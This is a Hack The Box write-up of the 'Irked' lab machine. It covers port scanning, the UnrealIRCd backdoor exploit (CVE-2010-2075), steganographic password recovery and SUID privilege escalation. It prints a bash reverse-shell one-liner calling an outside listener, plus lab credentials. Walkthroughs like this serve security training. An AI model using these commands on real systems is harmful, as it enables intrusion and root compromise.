---
title: "Irked"
date: 2023-09-03T14:03:47+02:00
tags: ["privesc","web","linux"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with a IRC port witch a Backdoor Command Execution which gives us RCE. In this machine we need to privEsc two times one taking advantage of a hidden password on a picture and the other one executing a SUID binary which execute a script as root."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Irked
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Irked

![Untitled](/HTB/irked-icon.png)

## Tools Used

- nmap
- searchsploit

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34967/udp   status
|   100024  1          46959/udp6  status
|   100024  1          49562/tcp   status
|_  100024  1          50338/tcp6  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
49562/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see we have 7 open ports one for **ssh** on port 22, a **http website** on port 80, two **rpc** on ports 111 and 49562 and the three last ones fore **irc** service running on 6697, 8067 and 65534.

## Enumeration

Let’s take a look at the website.

![Untitled](/HTB/irked-1.png)

The website is very simple has a picture and leaks a message that says that **IRC** is almost working.

So I started a quick **fuzz** with **gobuster**.

```bash
gobuster dir -u http://10.10.10.117/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -t 100 -o fuzz | tee fuzz.save
```

But nothing interesting is displayed.

Once at this point I started enumerating **irc service**.

Thanks to this **[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc)** post I found interesting commands to enumerate this services.

I used the following commands with a fake credentials in order to see if an authentication is done at background to connect to the service.

```bash
PASS test
NICK test
USER test1 test2 10.10.10.117 :test3
```

![Untitled](/HTB/irked-2.png)

When we establish the connection the irc version is leaked so I search for an exploit on **searchsploit**

## Exploiting

![Untitled](/HTB/irked-3.png)

One metasploitable Backdoor Command Execution is shown but we need to search for one non-metasploitable. 

In order to see alternatives I accessed to the exploit website where we can see the exploit CVE which is [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)

Searching on goole I found a [blog](https://vk9-sec.com/cve-2010-2075command-execution-unrealircd-3-2-8-1-backdoor/) talking about an alternative.

Basically we are able to perform a backdoor command execution on irc thanks to a **nmap** script with the following command.

```bash
nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='bash -c "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1"' 10.10.10.117
```

But before executing the previous command we need to set a **nc** listener.

```bash
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/irked-4.png)

Once executed we have a shell as **ircd**

In the **ircd’s** home directory there is no flag so I try to access to other users.

![Untitled](/HTB/irked-5.png)

## Escalating Privilege

When I tried to access to **djmardov** I can but don’t let me cat the flag so curious.

![Untitled](/HTB/irked-6.png)

Maybe some interesting file it’s inside this directory so let’s check it.

![Untitled](/HTB/irked-7.png)

When I accessed to the **Documents** directory I found a file named **.backup**

```bash
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

It’s seems a **steganography** backup password If we remember the website homepage has a picture. Maybe if we use a tool like **steghide** with the password found we can get some valuable information.

Once downloaded the picture I perform the following command in order to extract hidden data.

```bash
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```

We have been able to extract a file named **pass.txt**

```bash
Kab6h+m+bbp2J:HG
```

Let’s try this password to log as **djmardov**.

![Untitled](/HTB/irked-8.png)

It worked.

![Untitled](/HTB/irked-9.png)

Now only rests to **privEsc**, first I am going to enumerate **SUID** files with find.

```bash
find / \-perm -4000 2>/dev/null
```

```bash
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
./usr/sbin/exim4
./usr/sbin/pppd
./usr/bin/chsh
./usr/bin/procmail
./usr/bin/gpasswd
./usr/bin/newgrp
./usr/bin/at
./usr/bin/pkexec
./usr/bin/X
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/viewuser
./sbin/mount.nfs
./bin/su
./bin/mount
./bin/fusermount
./bin/ntfs-3g
./bin/umount
```

No one seems exploitable at **GTFOBins** but **viewuser** called my attention.

Let’s run it to see what it does.

![Untitled](/HTB/irked-10.png)

It’s seems a app that is being developed, I like that, is more likely to be vulnerable.

If we check at the last line of the command output, It’s trying to do something with `/tmp/listusers` but is not found.

Let’s put a test file in `/tmp/listusers`

![Untitled](/HTB/irked-11.png)

Now the outputted error is kind of different maybe is talking about execution permissions.

Let’s modify a little bit the test file in order to execute a **whoami**.

![Untitled](/HTB/irked-12.png)

My deduction is right, the program is executing the `/tmp/listusers` as bash script and is executed by the **root**.

Let’s set a **nc** listener and put a reverse shell on `/tmp/listusers` in order to **privEsc**.

```bash
nc -lv 4445
```

![Untitled](/HTB/irked-14.png)

![Untitled](/HTB/irked-13.png)

**Thank you for reading, and happy hacking! 😄**